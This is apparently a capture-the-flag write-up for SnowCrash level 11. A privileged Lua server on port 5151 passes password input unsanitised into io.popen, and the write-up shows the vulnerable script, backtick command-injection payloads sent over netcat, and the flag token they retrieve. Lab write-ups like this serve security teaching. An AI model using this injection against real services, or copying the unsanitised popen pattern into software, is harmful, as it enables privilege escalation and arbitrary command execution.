# Level 11: Script Privilege Escalation

### Goal
Exploit a vulnerability in a Lua script that runs with elevated privileges (flag11 user permissions) through code injection in a subprocess call.

## Steps

### I- Initial Analysis
In the home directory, there's a Lua script `level11.lua` with SUID/GUID bits set, meaning it runs with **flag11**'s permissions regardless of who executes it.

1. **File Examination:**
	```bash
	level11@SnowCrash:~$ ls -l
	total 4
	-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
	```

2. **Script Status:**
	```bash
	level11@SnowCrash:~$ ./level11.lua
	lua: ./level11.lua:3: address already in use
	stack traceback:
		[C]: in function 'assert'
		./level11.lua:3: in main chunk
		[C]: ?
	```
	This error message indicates that the script is already running since the port it tries to bind to is already in use.
	We can confirm this by checking running processes:
	
	```bash
	level11@SnowCrash:~$ ps aux | grep lua
	flag11    1852  0.0  0.0   2896   960 ?        S    12:30   0:00 lua /home/user/level11/level11.lua
	level11   2138  0.0  0.0   4380   820 pts/0    S+   13:01   0:00 grep --color=auto lua
	```
	The output shows that the script is indeed running under the flag11 user. 

3. **Script Content:**
	```lua
	#!/usr/bin/env lua
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()

	data = string.sub(data, 1, 40)

	return data
	end

	while 1 do
	local client = server:accept()
	client:send("Password: ")
	client:settimeout(60)
	local l, err = client:receive()
	if not err then
		print("trying " .. l)
		local h = hash(l)

		if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
			client:send("Erf nope..\n");
		else
			client:send("Gz you dumb*\n")
		end

	end

	client:close()
	end
	```

### II - Vulnerability Analysis
1. The script runs a server on port `5151`
2. It accepts connections and prompts for a password
3. The vulnerability lies in the `hash()` function:
	```bash
	function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	```
   - It uses `io.popen()` to execute a shell command.  
   *`io.popen()` execute a command in a separate process and returns a file handle that you can use to read data from command's output.*
   - The `pass` input is directly injected into the command without sanitization
   - Command injection is possible through backticks or shell operators

### III - Exploitation Steps
Since the script is running a `server` on port `5151`, we can use **Netcat** to connect to it and exploit the command injection vulnerability.

1. **Verify Privilege Escalation:**
	```bash
	level11@SnowCrash:~$ nc 127.0.0.1 5151
	Password: `echo hello` > /tmp/test
	Erf nope..
	level11@SnowCrash:~$ cat /tmp/test
	hello
	```

2. **Retrieve the Flag:**
	```bash
	level11@SnowCrash:~$ nc 127.0.0.1 5151
	Password: `getflag > /tmp/token`
	Erf nope..
	level11@SnowCrash:~$ cat /tmp/token
	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
	```

	*Note:*  
	*- `nc` command: allows us to connect to the Lua script's server running on port `5151`.*  
	*- `127.0.0.1`: is the loopback address, which refers to the **localhost**.*
